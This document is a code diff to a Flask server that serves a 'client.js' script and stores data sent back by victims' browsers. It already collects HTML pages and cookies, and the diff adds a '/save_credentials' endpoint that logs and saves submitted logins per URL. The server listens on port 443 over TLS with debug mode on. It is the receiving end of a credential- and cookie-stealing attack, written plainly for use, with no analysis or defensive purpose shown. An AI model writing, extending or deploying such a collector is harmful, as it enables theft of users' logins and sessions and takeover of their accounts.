@@ -7,8 +7,10 @@ CORS(app)
 
 html_pages = sqlDB('html_pages.db')
 cookies = sqlDB('cookies.db')
+credentials = sqlDB('credentials.db')
 html_pages.create_db()
 cookies.create_db()
+credentials.create_db()
 
 @app.route ('/client.js', methods=['GET'])
 def clientjs():
@@ -33,6 +35,17 @@ def save_cookies():
 	name = request.form['name']
 	value = request.form['value']
 	cookies.insert_content((name, value))
+	return "OK"
+
+@app.route ('/save_credentials', methods=['POST'])
+def save_credentials():
+	if 'url' not in request.form.keys() or 'value' not in request.form.keys():
+		return "Invalid save cookie request", 400
+	url = request.form['url']
+	value = request.form['value']
+	print(f"[+] Received credentials for {url}!")
+	print(value)
+	credentials.insert_content((url, value))
 	return "OK"
 
 app.run(host='0.0.0.0', port=443, ssl_context=('cert.pem', 'key.pem'), debug=True)
